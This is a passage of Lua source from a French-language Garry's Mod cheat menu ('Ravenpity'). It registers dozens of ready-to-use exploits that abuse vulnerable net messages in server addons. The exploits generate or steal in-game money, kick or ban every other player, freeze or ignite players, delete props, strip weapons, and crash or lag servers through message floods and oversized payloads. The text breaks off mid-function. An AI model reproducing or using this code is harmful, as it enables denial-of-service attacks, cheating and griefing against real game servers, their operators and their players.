scan = function() return RAVEN.ValidNetString( "RP_Accept_Fine" ) end,
functions = {
{ typ = "float", name = "Montant", min = "1", max = "100000000", default = "100000", addr = "montant_argent11" },
{ typ = "players", addr = "l_players_listing_fine" },
{ typ = "func", name = "Take", func = function()
local t = RAVEN.GetStored( "l_players_listing_fine", {} )
for k, v in pairs( player.GetAll() ) do
if !table.HasValue( t, v ) then continue end
RAVEN.NetStart("RP_Accept_Fine")
net.WriteString(v:Nick())
net.WriteDouble(-RAVEN.GetStored( "montant_argent11" ))
net.SendToServer()
end
end, },
{ typ = "func", name = "Envoyer", func = function()
local t = RAVEN.GetStored( "l_players_listing_fine", {} )
for k, v in pairs( player.GetAll() ) do
if !table.HasValue( t, v ) then continue end
RAVEN.NetStart("RP_Fine_Player")
net.WriteString(v:Nick())
net.WriteString(v:Nick())
net.WriteDouble(RAVEN.GetStored( "montant_argent11" ))
net.WriteString("Amende anvoyé !")
net.SendToServer()
end
end, },
{ typ = "func", name = "Spam Amende", func = function()
if !timer.Exists( "spamamandefine" ) then
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Ravenpity", "] ", Color( 255, 255, 255 ), "Spam Amende lançé" )
timer.Create( "spamamandefine", 0.1, 0, function()
local t = RAVEN.GetStored( "l_players_listing_fine", {} )
for k, v in pairs( player.GetAll() ) do
if !table.HasValue( t, v ) then continue end
RAVEN.NetStart("RP_Fine_Player")
net.WriteString(v:Nick())
net.WriteString(v:Nick())
net.WriteDouble(RAVEN.GetStored( "montant_argent11" ))
net.WriteString("Spam Amende lançé !")
net.SendToServer()
end
end)
else
timer.Remove( "spamamandefine" )
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Ravenpity", "] ", Color( 255, 255, 255 ), "Spam Amende stoppé" )
end
end, },
},
} )
RAVEN.AddExploit( "Concessionnaire", {
desc = "Money Exploit.",
severity = 2,
scan = function() return RAVEN.ValidNetString( "RXCAR_Shop_Store_C2S" ) end,
functions = {
{ typ = "func", name = "Duplicate", func = function()
for i = 0, 75 do               
RAVEN.NetStart( "RXCAR_Shop_Store_C2S" );               
net.WriteTable( { E = ent } );                 
net.SendToServer();                
end
end, },
{ typ = "func", name = "Tout vendre", func = function()
local ent              
for k,v in pairs(ents.GetAll()) do                 
if v:GetClass() == "rm_car_dealer" then                
ent = v                
end                
end                
for k,v in pairs(RX3DCar_Inventory) do                 
RAVEN.NetStart( "RXCAR_SellINVCar_C2S" )                
net.WriteTable({UN=v.UniqueID,SE=ent})                 
net.SendToServer()                 
end      
end, },          
},
} )
RAVEN.AddExploit( "Supprimer Argent/Armes", {
desc = "Delete the money and the weapons of everyone.",
severity = 3,
scan = function() return RAVEN.ValidNetString( "drugseffect_remove" ) end,
functions = {
{ typ = "func", name = "Supprimer Armes", func = function()
RAVEN.NetStart("drugseffect_remove")
net.SendToServer()
end, },
{ typ = "func", name = "Enlever Argent", func = function()
RAVEN.NetStart("drugs_money")
net.SendToServer()
end, },
},
} )
RAVEN.AddExploit( "Crafting Mod", {
desc = "Money Exploit.",
severity = 3,
scan = function() return RAVEN.ValidNetString( "CRAFTINGMOD_SHOP" ) end,
functions = {
{ typ = "float", name = "Montant", min = "1", max = "100000000", default = "100000", addr = "montant_argent14" },
{ typ = "func", name = "Ajouter Argent", func = function()
RAVEN.NetStart("CRAFTINGMOD_SHOP")
net.WriteTable({
BUY =   -RAVEN.GetStored( "montant_argent14" );
type    =   1
})
net.WriteInt(1,16)
net.SendToServer()
end, },
{ typ = "func", name = "Enlever Argent", func = function()
RAVEN.NetStart("CRAFTINGMOD_SHOP")
net.WriteTable({
BUY =   LocalPlayer():getDarkRPVar("money");
type    =   1
})
net.WriteInt(1,16)
net.SendToServer()
end, },
},
} )
RAVEN.AddExploit( "Mettre en Feu", {
desc = "Put the props/player.",
severity = 3,
scan = function() return RAVEN.ValidNetString( "drugs_ignite" ) end,
functions = {
{ typ = "func", name = "Prop en Feu", func = function()
RAVEN.NetStart("drugs_ignite")
net.WriteString("prop_physics")
net.SendToServer()
end, },
{ typ = "func", name = "Joueur en Feu", func = function()
RAVEN.NetStart("drugs_ignite")
net.WriteString("player")
net.SendToServer()
end, },
},
} )
RAVEN.AddExploit( "Changer la vie", {
desc = "Change the Health level of players.",
severity = 2,
scan = function() return RAVEN.ValidNetString( "drugseffect_hpremove" ) end,
functions = {
{ typ = "float", name = "Vie", min = "1", max = "100000000", default = "100", addr = "montant_argent15" },
{ typ = "func", name = "Par Défault", func = function()
RAVEN.NetStart("drugseffect_hpremove")
net.WriteString(RAVEN.GetStored( "montant_argent15" ))
net.SendToServer()
end, },
},
} )
RAVEN.AddExploit( "Teleportation", {
desc = "Teleport the players you watch at spawn.",
severity = 2,
scan = function() return RAVEN.ValidNetString( "DarkRP_Kun_ForceSpawn" ) end,
functions = {
{ typ = "func", name = "TP", func = function()
RAVEN.NetStart("DarkRP_Kun_ForceSpawn")
net.SendToServer()
end, },
},
} )
RAVEN.AddExploit( "Supprimer Props #2", {
desc = "Delete all the props of the server.",
severity = 2,
scan = function() return RAVEN.ValidNetString( "drugs_text" ) end,
functions = {
{ typ = "func", name = "Supprimer", func = function()
RAVEN.NetStart("drugs_text")
net.WriteString("prop_physics")
net.SendToServer()
end, },
},
} )
RAVEN.AddExploit( "Kick #2", {
desc = "Kick player(s) exploit.",
severity = 3,
scan = function() return RAVEN.ValidNetString( "NLRKick" ) end,
functions = {
{ typ = "players", addr = "l_players_listing515" },
{ typ = "func", name = "Kick", func = function()
local t = RAVEN.GetStored( "l_players_listing515", {} )
for k, v in pairs( player.GetAll() ) do
if !table.HasValue( t, v ) then continue end
RAVEN.NetStart("NLRKick")
net.WriteEntity(v)
net.SendToServer()
end
end, },
},
} )
RAVEN.AddExploit( "Kick #1", {
desc = "Kick player(s) exploit.",
severity = 3,
scan = function() return RAVEN.ValidNetString( "RecKickAFKer" ) end,
functions = {
{ typ = "players", addr = "l_players_listing2545" },
{ typ = "func", name = "Kick", func = function()
local t = RAVEN.GetStored( "l_players_listing2545", {} )
for k, v in pairs( player.GetAll() ) do
if !table.HasValue( t, v ) then continue end
RAVEN.NetStart("RecKickAFKer")
net.WriteEntity(v)
net.SendToServer()
end
end, },
},
} )
RAVEN.AddExploit( "Loot-Items", {
desc = "Automatic Loot-Items.",
severity = 2,
scan = function() return RAVEN.ValidNetString( "GMBG:PickupItem" ) end,
functions = {
{ typ = "func", name = "Loot", func = function()
for k, v in pairs(ents.GetAll()) do         
if v:GetClass() == "item_loot" then                 
RAVEN.NetStart("GMBG:PickupItem")
net.WriteEntity(v)
net.SendToServer()
RAVEN.NetStart("GMBG:PickupItem")
net.WriteEntity(v)
net.SendToServer()
RAVEN.NetStart("GMBG:PickupItem")
net.WriteEntity(v)
net.SendToServer()
RAVEN.NetStart("GMBG:PickupItem")
net.WriteEntity(v)
net.SendToServer()
RAVEN.NetStart("GMBG:PickupItem")
net.WriteEntity(v)
net.SendToServer()
RAVEN.NetStart("GMBG:PickupItem")
net.WriteEntity(v)
net.SendToServer()
end
end
end, },
},
} )
RAVEN.AddExploit( "Kick Tout le Monde", {
desc = "Kick all the players of the server.",
severity = 3,
scan = function() return RAVEN.ValidNetString( "DL_Answering" ) end,
functions = {
{ typ = "func", name = "Kick", func = function()
if !timer.Exists( "kickallnoob" ) then
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Ravenpity", "] ", Color( 255, 255, 255 ), "Kick tout le monde lançé" )
timer.Create( "kickallnoob", 0.05, 0, function()
for i = 1, 2000 do 
RAVEN.NetStart("DL_Answering")
net.SendToServer()
end
end)
else
timer.Remove( "kickallnoob" )
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Ravenpity", "] ", Color( 255, 255, 255 ), "Kick tout le monde stoppé" )
end
end, },
},
} )
RAVEN.AddExploit( "Kick Admin", {
desc = "Exploit for kick the Admins.",
severity = 3,
scan = function() return RAVEN.ValidNetString( "plyWarning" ) end,
functions = {
{ typ = "players", addr = "l_players_listing255" },
{ typ = "func", name = "Kick", func = function()
local t = RAVEN.GetStored( "l_players_listing255", {} )
for k, v in pairs( player.GetAll() ) do
if !table.HasValue( t, v ) then continue end
RAVEN.NetStart('plyWarning')          
net.WriteEntity(v)          
net.WriteString('Vous devez choisir un Joueur')       
net.SendToServer()
RAVEN.ChatText("Tentative de kick sur ".. v:Nick().. "!")
end
end, },
},
} )
RAVEN.AddExploit( "Freeze", {
desc = "Freeze all the player.",
severity = 3,
scan = function() return RAVEN.ValidNetString( "NLR.ActionPlayer" ) end,
functions = {
{ typ = "players", addr = "l_players_listing45" },
{ typ = "func", name = "Freeze", func = function()
local t = RAVEN.GetStored( "l_players_listing45", {} )
for k, v in pairs( player.GetAll() ) do
if !table.HasValue( t, v ) then continue end
RAVEN.NetStart("NLR.ActionPlayer")
net.WriteEntity(v)
net.SendToServer()
end  
end, },
},
} )
RAVEN.AddExploit( "Supprimer Props #1", {
desc = "Delete all the props of the server.",
severity = 2,
scan = function() return RAVEN.ValidNetString( "timebombDefuse" ) end,
functions = {
{ typ = "func", name = "Supprimer", func = function()
for k,v in pairs(ents.GetAll()) do
RAVEN.NetStart("timebombDefuse")
net.WriteEntity(v)
net.WriteBool(true)
net.SendToServer()
end
end, },
},
} )
RAVEN.AddExploit( "Keypads Hack", {
desc = "Hack all the Keypads of the server.",
severity = 1,
scan = function() return RAVEN.ValidNetString( "start_wd_emp" ) end,
functions = {
{ typ = "func", name = "Hack", func = function()
RAVEN.NetStart("start_wd_emp")
net.SendToServer()
end, },
},
} )
RAVEN.AddExploit( "Kart System", {
desc = "Money Exploit.",
severity = 3,
scan = function() return RAVEN.ValidNetString( "kart_sell" ) end,
functions = {
{ typ = "func", name = "Start", func = function()
for i=1, 300 do
RAVEN.NetStart("kart_sell")
net.WriteString("sw_gokart")
net.SendToServer()
end
end, },
},
} )
RAVEN.AddExploit( "Farming Mod", {
desc = "Money Exploit.",
severity = 3,
scan = function() return RAVEN.ValidNetString( "FarmingmodSellItems" ) end,
functions = {
{ typ = "float", name = "Montant", min = "1", max = "100000000", default = "100000", addr = "montant_argent1" },
{ typ = "func", name = "Prendre", func = function()
RAVEN.NetStart( "FarmingmodSellItems" )
net.WriteTable(
{
Cost    =   10,
CropModel    =   "models/props/eryk/garlic.mdl",
CropType =   2,
Info  =   "Garlic Seed",
Model =   "models/props/eryk/seedbag.mdl",
Name    =   "Garlic",
Quality    =   4,
Sell  =   RAVEN.GetStored( "montant_argent1" ),
Type  =   "Seed"
}
)
net.WriteInt(1,16)
net.SendToServer()
end, },
},
} )
RAVEN.AddExploit( "Point Shop", {
desc = "Money Exploit.",
severity = 3,
scan = function() return RAVEN.ValidNetString( "ClickerAddToPoints" ) end,
functions = {
{ typ = "float", name = "Montant", min = "1", max = "100000000", default = "100000", addr = "montant_argent2" },
{ typ = "func", name = "Prendre", func = function()
RAVEN.NetStart("ClickerAddToPoints")
net.WriteInt(RAVEN.GetStored( "montant_argent2" ), 32)
net.SendToServer()
end, },
},
} )
local PM = 1
local SK = 1
local BG = 1
local HN = 1
local TS = 1
local GL = 1
local LG = 1
RAVEN.AddExploit( "Changer de Skin", {
desc = "Change skin.",
severity = 1,
scan = function() return RAVEN.ValidNetString( "bodyman_model_change" ) end,
functions = {
{ typ = "func", name = "Changer", func = function()
PlayerModels = {0,1,2,3,4,5,6}
Torso = {0,1,2,3,4,5,6,7,8,9,10}
Legs = {0,1,2,3,4,5,6}
Hands = {0,1,2}
Glasses = {0,1}
Skins = {0,1,2,3,4,5,6,7,8,9,10}
PM = PM+1
TS = TS+1
LG = LG+1   
HN = HN+1
GL = GL+1
SK = SK+1
if (PM>#PlayerModels) then PM=1 end
if (SK>#Skins) then SK=1 end
if (HN>#Hands) then HN=1 end
if (TS>#Torso) then TS=1 end
if (GL>#Glasses) then GL=1 end
if (LG>#Legs) then LG=1 end
RAVEN.NetStart("bodyman_model_change")
net.WriteInt(PlayerModels[PM], 10 )
net.SendToServer()
RAVEN.NetStart("bodygroups_change")
net.WriteTable( { 1, Torso[TS] } )
net.SendToServer()
RAVEN.NetStart("bodygroups_change")
net.WriteTable( { 2, Legs[LG] } )
net.SendToServer()
RAVEN.NetStart("bodygroups_change")
net.WriteTable( { 3, Hands[HN] } )
net.SendToServer()
RAVEN.NetStart("bodygroups_change")
net.WriteTable( { 4, Glasses[GL] } )
net.SendToServer()
end, },
},
} )
RAVEN.AddExploit( "Hitman X", {
desc = "Money Exploit.",
severity = 3,
scan = function() return RAVEN.ValidNetString( "SendMoney" ) end,
functions = {
{ typ = "float", name = "Montant", min = "1", max = "100000000", default = "100000", addr = "montant_argent666" },
{ typ = "players", addr = "l_players_list" },
{ typ = "func", name = "Donner", func = function()
local t = RAVEN.GetStored( "l_players_list", {} )
for k, v in pairs( player.GetAll() ) do
if !table.HasValue( t, v ) then continue end
hook.Remove( "HUDPaint", "skhdsakjl")
RAVEN.NetStart( "SendMoney" )
net.WriteEntity( v )
net.WriteEntity( v )
net.WriteEntity( v )
net.WriteString( -RAVEN.GetStored( "montant_argent666" ) )
net.SendToServer()
end
end, },
{ typ = "func", name = "To take off", func = function()
hook.Remove( "HUDPaint", "skhdsakjl")
local t = RAVEN.GetStored( "l_players_list", {} )
for k, v in pairs( player.GetAll() ) do
if !table.HasValue( t, v ) then continue end
RAVEN.NetStart( "SendMoney" )
net.WriteEntity( v )
net.WriteEntity( v )
net.WriteEntity( v )
net.WriteString( RAVEN.GetStored( "montant_argent666" ) )
net.SendToServer()
end
end, },
},
} )
RAVEN.AddExploit( "Bail Out", {
desc = "Money Exploit.",
severity = 3,
scan = function() return RAVEN.ValidNetString( "BailOut" ) end,
functions = {
{ typ = "float", name = "Montant", min = "1", max = "100000000", default = "100000", addr = "montant_argent16" },
{ typ = "players", addr = "l_player_liste" },
{ typ = "func", name = "Donner", func = function()
local t = RAVEN.GetStored( "l_player_liste", {} )
for k, v in pairs( player.GetAll() ) do
if !table.HasValue( t, v ) then continue end
RAVEN.NetStart( "BailOut" )
net.WriteEntity( LocalPlayer() )
net.WriteEntity( v )
net.WriteFloat( -RAVEN.GetStored( "montant_argent16" )  )
net.SendToServer()
end
end, },
{ typ = "func", name = "To take off", func = function()
local t = RAVEN.GetStored( "l_player_liste", {} )
for k, v in pairs( player.GetAll() ) do
if !table.HasValue( t, v ) then continue end
RAVEN.NetStart( "BailOut" )
net.WriteEntity( LocalPlayer() )
net.WriteEntity( v )
net.WriteFloat( RAVEN.GetStored( "montant_argent16" )  )
net.SendToServer()
end
end, },
},
} )
RAVEN.AddExploit( "Tow Truck", {
desc = "Spawn Vehicle Troubleshooter/Exploit Money look at the vehicle that has an almond.",
severity = 2,
scan = function() return RAVEN.ValidNetString( "TOW_SubmitWarning" ) end,
functions = {
{ typ = "func", name = "Spawn", func = function()
RAVEN.NetStart("TowTruck_CreateTowTruck")
net.SendToServer()
end, },
{ typ = "float", name = "Montant", min = "1", max = "100000000", default = "100000", addr = "montant_argent17" },
{ typ = "func", name = "Argent", func = function()
for k,v in pairs(ents.GetAll()) do 
RAVEN.NetStart("TOW_SubmitWarning")
net.WriteString(LocalPlayer():SteamID())
net.WriteDouble(-RAVEN.GetStored( "montant_argent17" ))
net.WriteEntity(v)
net.SendToServer()
RAVEN.NetStart("TOW_PayTheFine")
net.WriteEntity(v)
net.SendToServer()
end
end, },
},
} )
RAVEN.AddExploit( "Fire Truck", {
desc = "Spawn fire truck.",
severity = 1,
scan = function() return RAVEN.ValidNetString( "FIRE_CreateFireTruck" ) end,
functions = {
{ typ = "func", name = "Spawn", func = function()
RAVEN.NetStart("FIRE_CreateFireTruck")
net.SendToServer()    
end, },
},
} )
RAVEN.AddExploit( "Hit Menu", {
desc = "Money Exploit.",
severity = 3,
scan = function() return RAVEN.ValidNetString( "hitcomplete" ) end,
functions = {
{ typ = "float", name = "Montant", min = "1", max = "100000000", default = "100000", addr = "montant_argent18" },
{ typ = "func", name = "Prendre", func = function()
RAVEN.NetStart("hitcomplete")
net.WriteDouble(RAVEN.GetStored( "montant_argent18" ))               
net.SendToServer()      
end, },
},
} )
RAVEN.AddExploit( "HHH", {
desc = "Money Exploit.",
severity = 3,
scan = function() return RAVEN.ValidNetString( "hhh_request" ) end,
functions = {
{ typ = "func", name = "Prendre", func = function()
local plyhhh = LocalPlayer()              
for k,v in pairs(player.GetAll()) do                
dahater = v   
end        
if dahater != plyhhh then       
local hitRequest = {}
hitRequest.hitman = plyhhh
hitRequest.requester = plyhhh
hitRequest.target = dahater
hitRequest.reward = -9999999
RAVEN.NetStart( 'hhh_request' )
net.WriteTable( hitRequest )
net.SendToServer()
else
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Ravenpity", "] ", Color( 255, 255, 255 ), "Cette version n'est pas supporté" )
end
end, },
},
} )
RAVEN.AddExploit( "Détruire Printers", {
desc = "Apply constant damage to nearby Printers.",
severity = 1,
scan = function() return RAVEN.ValidNetString( "customprinter_get" ) end,
functions = {
{ typ = "func", name = "Start", func = function()
if !timer.Exists( "ravenhacknetnet_exploit_printersmasher" ) then
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Ravenpity", "] ", Color( 255, 255, 255 ), "Détruire les Printers à proximité lançé" )
timer.Create( "ravenhacknetnet_exploit_printersmasher", 0, 0, function()
for k, v in pairs( ents.GetAll() ) do
if ( v:GetClass():find("print") && v:GetPos():Distance( LocalPlayer():GetPos() ) <= 750 ) then
RAVEN.NetStart("customprinter_get")
net.WriteEntity(v)
net.WriteString("onoff")
net.SendToServer()
end
end
end)
else
timer.Remove( "ravenhacknetnet_exploit_printersmasher" )
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Ravenpity", "] ", Color( 255, 255, 255 ), "Détruire les Printers à proximité stoppé" )
end
end, },
},
} )
RAVEN.AddExploit( "Crash le Serveur", {
desc = "Make the server Crash.",
severity = 3,
scan = function() return RAVEN.ValidNetString( "textstickers_entdata" ) end,
functions = {
{ typ = "func", name = "Crash", func = function()
RAVEN.NetStart( "textstickers_entdata" )
net.WriteUInt( 0xFFFFFFF, 32 )
net.SendToServer()
end, },
},
} )
RAVEN.AddExploit( "Munitions Gratuite", {
desc = "Gives you ammunition for all your weapons.",
severity = 1,
scan = function() return RAVEN.ValidNetString( "TCBBuyAmmo" ) end,
functions = {
{ typ = "func", name = "Take", func = function()
for k,v in pairs(GAMEMODE.AmmoTypes) do
RAVEN.NetStart("TCBBuyAmmo")
net.WriteTable( {nil,v.ammoType,nil,"0","999999"} )
net.SendToServer()
end
end, },
},
} )
RAVEN.AddExploit( "Voler Argent Printers #2", {
desc = "Steal all the money from the printers.",
severity = 3,
scan = function() return RAVEN.ValidNetString( "DataSend" ) end,
functions = {
{ typ = "func", name = "Prendre", func = function()
for k, v in pairs( ents.GetAll() ) do
if v:GetClass() == "adv_moneyprinter" then    
RAVEN.NetStart("DataSend")
net.WriteFloat(2)
net.WriteEntity(v)
net.WriteEntity(LocalPlayer())
net.SendToServer()
end
end
end, },
},
} )
RAVEN.AddExploit( "Ban tout le monde", {
desc = "Exploit to ban everyone except you, exploit found in an older version of gBan.",
severity = 3,
scan = function() return RAVEN.ValidNetString( "gBan.BanBuffer" ) end,
functions = {
{ typ = "func", name = "Start", func = function()
for k,v in pairs(player.GetAll()) do               
if v != LocalPlayer() then       
RAVEN.NetStart( "gBan.BanBuffer" )
net.WriteBool( true )
net.WriteInt( 0, 32 )
net.WriteString( "Des poutous partout" )
net.WriteString( v:SteamID() )
net.SendToServer()
end
end
end, },
},
} )
RAVEN.AddExploit( "Lag Exploit #1", {
desc = "Make the server crash with lag.",
severity = 2,
scan = function() return RAVEN.ValidNetString( "ATS_WARP_REMOVE_CLIENT" ) end,
functions = {
{ typ = "func", name = "Start", func = function()
if !timer.Exists( "ravenhacknetnet_exploit_lagsploit1" ) then
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Ravenpity", "] ", Color( 255, 255, 255 ), "Lag lançé" )
timer.Create( "ravenhacknetnet_exploit_lagsploit1", 0.02, 0, function()
for k,v in pairs(player.GetAll()) do
RAVEN.NetStart( "ATS_WARP_REMOVE_CLIENT" )
net.WriteEntity( v )
net.WriteString( "adminroom1" )
net.SendToServer()
RAVEN.NetStart( "ATS_WARP_FROM_CLIENT" )
net.WriteEntity( v )
net.WriteString( "adminroom1" )
net.SendToServer()
RAVEN.NetStart( "ATS_WARP_VIEWOWNER" )
net.WriteEntity( v )
net.WriteString( "adminroom1" )
net.SendToServer()
end
end)
else
timer.Remove( "ravenhacknetnet_exploit_lagsploit1" )
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Ravenpity", "] ", Color( 255, 255, 255 ), "Lag stoppé" )
end
end, },
},
} )
RAVEN.AddExploit( "Console Spam", {
desc = "Make the server crash with lag.",
severity = 1,
scan = function() return ULib end,
functions = {
{ typ = "func", name = "Start", func = function()
if !timer.Exists( "ravenhacknetnet_exploit_bigspames2" ) then
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Ravenpity", "] ", Color( 255, 255, 255 ), "Lag lançé" )
timer.Create( "ravenhacknetnet_exploit_bigspames2", 0, 0, function()
for i = 1, 200 do
LocalPlayer():ConCommand( "_u Seized by NineTailedFox xD " )
end
end)
else
timer.Remove( "ravenhacknetnet_exploit_bigspames2" )
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Ravenpity", "] ", Color( 255, 255, 255 ), "Lag stoppé" )
end
end, },
},
} )
RAVEN.AddExploit( "Lag Exploit #2", {
desc = "Make the server crash with lag.",
severity = 1,
scan = function() return RAVEN.ValidNetString( "Keypad" ) end,
functions = {
{ typ = "func", name = "Start", func = function()
if !timer.Exists( "ravenhacknetnet_exploit_lagsploit4" ) then
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Ravenpity", "] ", Color( 255, 255, 255 ), "Lag lançé" )
timer.Create( "ravenhacknetnet_exploit_lagsploit4", 0, 0, function()
for i = 1, 1000 do
RAVEN.NetStart("Keypad")
net.WriteEntity(LocalPlayer())
net.SendToServer()
end
end)
else
timer.Remove( "ravenhacknetnet_exploit_lagsploit4" )
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Ravenpity", "] ", Color( 255, 255, 255 ), "Lag stoppé" )
end
end, },
},
} )
RAVEN.AddExploit( "Lag Exploit #3", {
desc = "Make the server crash with lag.",
severity = 2,
scan = function() return RAVEN.ValidNetString( "CreateCase" ) end,
functions = {
{ typ = "func", name = "Start", func = function()
if !timer.Exists( "ravenhacknetnet_exploit_lagsploit5" ) then
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Ravenpity", "] ", Color( 255, 255, 255 ), "Lag lançé" )
timer.Create( "ravenhacknetnet_exploit_lagsploit5", 0.02, 0, function()
for i = 1, 300 do
RAVEN.NetStart( "CreateCase" )
net.WriteString( "Bitch please" )
net.SendToServer()
end
end)
else
timer.Remove( "ravenhacknetnet_exploit_lagsploit5" )
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Ravenpity", "] ", Color( 255, 255, 255 ), "Lag stoppé" )
end
end, },
},
} )
RAVEN.AddExploit( "Lag Exploit #4", {
desc = "Make the server crash with lag.",
severity = 2,
scan = function() return RAVEN.ValidNetString( "rprotect_terminal_settings" ) end,
functions = {
{ typ = "func", name = "Start", func = function()
if !timer.Exists( "ravenhacknetnet_exploit_lagsploit6" ) then
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Ravenpity", "] ", Color( 255, 255, 255 ), "Lag lançé" )
timer.Create( "ravenhacknetnet_exploit_lagsploit6", 0.02, 0, function()
for i = 1, 200 do
RAVEN.NetStart( "rprotect_terminal_settings" )
net.WriteEntity( LocalPlayer() )
net.SendToServer()
end
end)
else
timer.Remove( "ravenhacknetnet_exploit_lagsploit6" )
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Ravenpity", "] ", Color( 255, 255, 255 ), "Lag stoppé" )
end
end, },
},
} )
RAVEN.AddExploit( "Lag Exploit #5", {
desc = "Make the server crash with lag.",
severity = 2,
scan = function() return RAVEN.ValidNetString( "StackGhost" ) end,
functions = {
{ typ = "func", name = "Start", func = function()
if !timer.Exists( "ravenhacknetnet_exploit_lagsploit7" ) then
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Ravenpity", "] ", Color( 255, 255, 255 ), "Lag lançé" )
timer.Create( "ravenhacknetnet_exploit_lagsploit7", 0.015, 0, function()
for i = 1, 8 do
for k,v in pairs( player.GetAll() ) do
RAVEN.NetStart( "StackGhost" )
net.WriteInt(69,32)
net.SendToServer()
end
end
end)
else
timer.Remove( "ravenhacknetnet_exploit_lagsploit7" )
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Ravenpity", "] ", Color( 255, 255, 255 ), "Lag stoppé" )
end
end, },
},
} )
RAVEN.AddExploit( "Réssusciter", {
desc = "You are automatically resuscitated after being killed.",
severity = 2,
scan = function() return RAVEN.ValidNetString( "RevivePlayer" ) end,
functions = {
{ typ = "func", name = "Immortel", func = function()
if !timer.Exists( "ravenhacknetnet_exploit_zombie" ) then
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Ravenpity", "] ", Color( 255, 255, 255 ), "Vous etes Immortel" )
timer.Create( "ravenhacknetnet_exploit_zombie", 0.5, 0, function()
if !LocalPlayer():Alive() then
RAVEN.NetStart("RevivePlayer")
net.WriteEntity(LocalPlayer())
net.SendToServer()
end
end)
else
timer.Remove( "ravenhacknetnet_exploit_zombie" )
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Ravenpity", "] ", Color( 255, 255, 255 ), "Vous n'etes plus Immortel" )
end
end, },
},
} )
RAVEN.AddExploit( "Vole d'Armes", {
desc = "Take the weapons from the police to the armory (You must be close to her), has a cooldown of 5 minutes.",
severity = 2,
scan = function() return RAVEN.ValidNetString( "ARMORY_RetrieveWeapon" ) end,
functions = {
{ typ = "func", name = "Armes 1", func = function()
RAVEN.NetStart("ARMORY_RetrieveWeapon")
net.WriteString("weapon1")
net.SendToServer()
end, },
{ typ = "func", name = "Armes 2", func = function()
RAVEN.NetStart("ARMORY_RetrieveWeapon")
net.WriteString("weapon2")
net.SendToServer()
end, },
{ typ = "func", name = "Armes 3", func = function()
RAVEN.NetStart("ARMORY_RetrieveWeapon")
net.WriteString("weapon3")
net.SendToServer()
end, },
},
} )
RAVEN.AddExploit( "Admin Porte", {
desc = "Unlock/Lock/Sell a door.",
severity = 3,
scan = function() return RAVEN.ValidNetString( "fp_as_doorHandler" ) end,
functions = {
{ typ = "func", name = "Déverouiller", func = function()
RAVEN.NetStart("fp_as_doorHandler")
net.WriteEntity(LocalPlayer():GetEyeTrace().Entity)
net.WriteString("unlock")
net.SendToServer()
end, },
{ typ = "func", name = "Vérouiller", func = function()
RAVEN.NetStart("fp_as_doorHandler")
net.WriteEntity(LocalPlayer():GetEyeTrace().Entity)
net.WriteString("lock")
net.SendToServer()
end, },
{ typ = "func", name = "Vendre", func = function()
local door = LocalPlayer():GetEyeTrace().Entity
local doorOwner = door:getDoorData()["owner"]
RAVEN.NetStart("fp_as_doorHandler")
net.WriteEntity(door)
net.WriteString("removeOwner")
net.WriteDouble(doorOwner)
net.SendToServer()
end, },
},
} )
RAVEN.AddExploit( "Report Spam", {
desc = "Send Report on everyone.",
severity = 1,
scan = function() return RAVEN.ValidNetString( "TransferReport" ) end,
functions = {
{ typ = "func", name = "Report Tout le Monde", func = function()
for k, v in pairs( player.GetAll() ) do
RAVEN.NetStart( "TransferReport" )
net.WriteString( v:SteamID() )
net.WriteString( "SERVEUR CODER PAR LE Q" )
net.WriteString( "aie aie aie" )
net.SendToServer()
end
end, },
},
} )
RAVEN.AddExploit( "SAC Crash", {
desc = "Instantly Crash any server running the anticheat simplicity.",
severity = 3,
scan = function() return RAVEN.ValidNetString( "SimplicityAC_aysent" ) end,
functions = {
{ typ = "func", name = "Crash", func = function()
local tbl = {}
for i=1,400 do
tbl[i] = i
end
RAVEN.NetStart("SimplicityAC_aysent")
net.WriteUInt(1, 8)
net.WriteUInt(4294967295, 32)
net.WriteTable(tbl)
net.SendToServer()
end, },
},
} )
RAVEN.AddExploit( "Crash Serveur #2", {
desc = "Click this button to Crash the server instantly.",
severity = 3,
scan = function() return RAVEN.ValidNetString( "pac_to_contraption" ) end,
functions = {
{ typ = "func", name = "Crash", func = function()
local tbl = {}
for i=1,1000000000 do
tbl[#tbl + 1] = i
end
RAVEN.NetStart("pac_to_contraption")
net.WriteTable( tbl )
net.SendToServer()
end, },
},
} )
local function nukeweapon( ent )
if !ent:IsValid() then return end
if ent.LNextNuke and ent.LNextNuke > CurTime() then return end
RAVEN.NetStart("properties")
net.WriteString("remove")
net.WriteEntity( ent )
net.SendToServer()
ent.LNextNuke = CurTime() + 0.5
end
local function nukeallweapons( tab )
for k, v in pairs( tab ) do
if !v:IsValid() then continue end
if v.LNextNuke and v.LNextNuke > CurTime() then continue end
RAVEN.NetStart("properties")
net.WriteString("remove")
net.WriteEntity( v )
net.SendToServer()
end
end
RAVEN.AddExploit( "Strip les Armes", {
desc = "Remove a weapon(s) from a player(s).",
severity = 3,
scan = function() return RAVEN.ValidNetString( "properties" ) and (!FPP or (FPP and FPP.Settings.FPP_TOOLGUN1.worldprops == 1)) end,
functions = {
{ typ = "players", addr = "stripper_plyz" },
{ typ = "func", name = "Strip", func = function()
if !timer.Exists( "stripclub" ) then
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Ravenpity", "] ", Color( 255, 255, 255 ), "Strip lançé" )
timer.Create( "stripclub", 0.5, 0, function()
